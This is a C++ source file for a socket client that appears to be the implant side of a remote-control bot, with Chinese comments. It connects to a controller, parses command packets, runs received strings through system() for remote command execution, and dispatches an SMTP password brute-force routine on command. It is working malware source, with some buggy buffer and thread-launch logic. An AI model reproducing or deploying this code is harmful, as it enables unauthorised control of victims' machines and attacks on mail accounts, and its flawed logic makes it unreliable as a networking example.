// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "ClientSocket.h"

#include <process.h>
#include <stdlib.h>
#include <MSTcpIP.h>
#include "Manager.h"
#include "until.h"
#include "protocol.h"
#include "smtpbruteforce.h"

#pragma comment(lib, "ws2_32.lib")

#define MAX_RECV_BUFFER 8192
#define MAX_SEND_BUFFER 8192
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


unsigned int __stdcall ThreadLoader(LPVOID param)
{
	unsigned int	nRet = 0;
#ifdef _DLL
	try
	{
#endif	
		THREAD_ARGLIST	arg;
		memcpy(&arg, param, sizeof(arg));
		SetEvent(arg.hEventTransferArg);
		// 与桌面交互

		if (arg.bInteractive)
//			SelectDesktop(NULL);
		
		nRet = arg.start_address(arg.arglist);
#ifdef _DLL
	}catch(...){};
#endif
	return nRet;
}

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive)
{
	HANDLE	hThread = INVALID_HANDLE_VALUE;
	THREAD_ARGLIST	arg;
	arg.start_address = (unsigned ( __stdcall *)( void * ))lpStartAddress;
	arg.arglist = (void *)lpParameter;
	arg.bInteractive = bInteractive;
	arg.hEventTransferArg = CreateEvent(NULL, false, false, NULL);
	hThread = (HANDLE)_beginthreadex((void *)lpThreadAttributes, dwStackSize, ThreadLoader, &arg, dwCreationFlags, (unsigned *)lpThreadId);
	WaitForSingleObject(arg.hEventTransferArg, INFINITE);
	CloseHandle(arg.hEventTransferArg);
	
	return hThread;
}


CClientSocket::CClientSocket()										// 初始化socket
{
	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
	m_hEvent = CreateEvent(NULL, true, false, NULL);				// manual-reset non-signaled
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
}


CClientSocket::~CClientSocket()										// 清空
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);					// 等待线程结束

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
}


bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	// 一定要清除一下，不然socket会耗尽系统资源
	Disconnect();

	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;

	// 创建套接字
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}

	hostent * pHostent = NULL;
	pHostent = gethostbyname((const char *)lpszHost);
	if (pHostent == NULL)
		return false;
	
	// 构造sockaddr_in结构, 并填充
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;					
	ClientAddr.sin_port	= htons(nPort);
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);		// 设置ip地址
	
	// 连接到服务器端
	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
		return false;

	/*
	const char chOpt = 1; // True
	// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	{
		// 设置超时详细信息
		tcp_keepalive	klive;
		klive.onoff = 1; // 启用保活
		klive.keepalivetime = 1000 * 60 * 3;		// 3分钟超时 Keep Alive
		klive.keepaliveinterval = 1000 * 5;			// 重试间隔为5秒 Resend if No-Reply
		WSAIoctl
			(
			m_Socket, 
			SIO_KEEPALIVE_VALS,
			&klive,
			sizeof(tcp_keepalive),
			NULL,
			0,
			(unsigned long *)&chOpt,
			0,
			NULL
			);
	}
	*/
	// 正在运行，创建工作者线程
	m_bIsRunning = true;
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	return true;
}


DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}
			printf("WorkThread - nSize = %d\n", nSize);
			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);
		}
	}
	return -1;
}


void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}


bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}


void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
{
	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();
			return;
		}
		printf("size = %d\n", dwIoSize);

		if(dwIoSize == HDR_SIZE)			// 放到里面进行处理吧
		{
			LPBYTE buf[8];
			CopyMemory(buf, lpBuffer, HDR_SIZE);				// 拷贝包头数据
			LPPacketHeader header = (LPPacketHeader)buf;
			if(header->packetType == PACKET_RESEND)							// 重传
			{
				// 重传	
				Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			}
		}

		m_ReadBuffer.Write(lpBuffer, dwIoSize);				// 写入到缓存中

		while( m_ReadBuffer.GetBufferLen() > HDR_SIZE ) 						// 如果接收到数据的长度大于包长
		{
			PBYTE buf[8];
			CopyMemory(buf, lpBuffer, HDR_SIZE);						// 拷贝包头数据
			LPPacketHeader header = (LPPacketHeader)buf;
			
			// 传输数据包的进度
			int nSize = header->packetLen + HDR_SIZE;									// 数据包长度
			
			// 接收到的数据包的长度大于一个数据包的长度， 读取一个数据包
			//
			// PacketType | PacketLen | CommandType | DataLen | Data...
			// 
			if ( m_ReadBuffer.GetBufferLen() >= nSize )
			{
				printf("buf len = %d packet len = %d len = %d\n", m_ReadBuffer.GetBufferLen(), nSize, header->packetLen);
				
				PBYTE pPacketHeader = new BYTE[HDR_SIZE];						// PacketHeader
				PBYTE pDataHeader = new BYTE[D_HDR_SIZE];						// DataHeader
				
				if( NULL == pPacketHeader || NULL == pDataHeader )
					throw "bad Allocate";
				
				m_ReadBuffer.Read(pPacketHeader, HDR_SIZE);						// PacketHeader
				m_ReadBuffer.Read(pDataHeader, D_HDR_SIZE);						// DataHeader
				
				int length = ((LPDataHeader)pDataHeader)->dataLen;				// 获取数据的长度, 读取数据包中的内容
				printf("data len = %d\n", length);
				PBYTE pData = new BYTE[length + 1];
				if( NULL == pData )
					throw "bad Allocate";
				memset(pData, 0, length + 1);
				m_ReadBuffer.Read(pData, length);	
				printf("pData = %s\n", pData);

				printf("packet type = %d - command type = %d\n", ((LPPacketHeader)pPacketHeader)->packetType, ((LPDataHeader)pDataHeader)->commandType);

				int packetType = ((LPPacketHeader)pPacketHeader)->packetType;
				
				if(PACKET_COMMAND == packetType)
				{
					int commandType = ((LPDataHeader)pDataHeader)->commandType;
					switch(commandType)
					{
						case HOST_REBOOT:
						case HOST_SHUTDOWN:
							system((const char *)pData);
							break;
						case HOST_HELLO:
							printf("pData = %s\n", pData);
							break;
						case EMAIL_BRUTEFORCE:
							smtp_bruteforce();
						default:
							break;
					}
				}
				m_ReadBuffer.ClearBuffer();
			}
		}

	}catch(...)			// 读取异常，这个有点意思啦！
	{
		Send(NULL, 0);
	}
}


void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    // 优雅的断开套接字
	//
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );

	CancelIo((HANDLE) m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	
	SetEvent(m_hEvent);	
	
	m_Socket = INVALID_SOCKET;
}


int CClientSocket::Send( LPBYTE lpData, UINT nSize )
{
	m_WriteBuffer.ClearBuffer();
	if (nSize > 0)
	{
		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = nSize + HDR_SIZE;

		// Write Data
		m_WriteBuffer.Write(lpData, nSize);
		
		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpData, nSize);						// 备份发送的数据
	}
	else // 要求重发, 写一个重传的包头，PACKET_RESEND
	{
		LPBYTE buf = new BYTE[8];
		LPPacketHeader header = (LPPacketHeader)buf;
		header->packetType = PACKET_RESEND;
		header->packetLen = 0;

		m_WriteBuffer.Write((LPBYTE)header->packetType, 4);
		m_WriteBuffer.Write((LPBYTE)header->packetLen, 4);

		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write((LPBYTE)header->packetType, 4);
		m_ResendWriteBuffer.Write((LPBYTE)header->packetLen, 4);		
	}

	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}


int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		int i = 0;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		
		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
	}
	// 发送最后的部分
	int i = 0;
	if (size > 0)
	{
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}


void CClientSocket::setManagerCallBack( CManager *pManager )
{
	m_pManager = pManager;
}


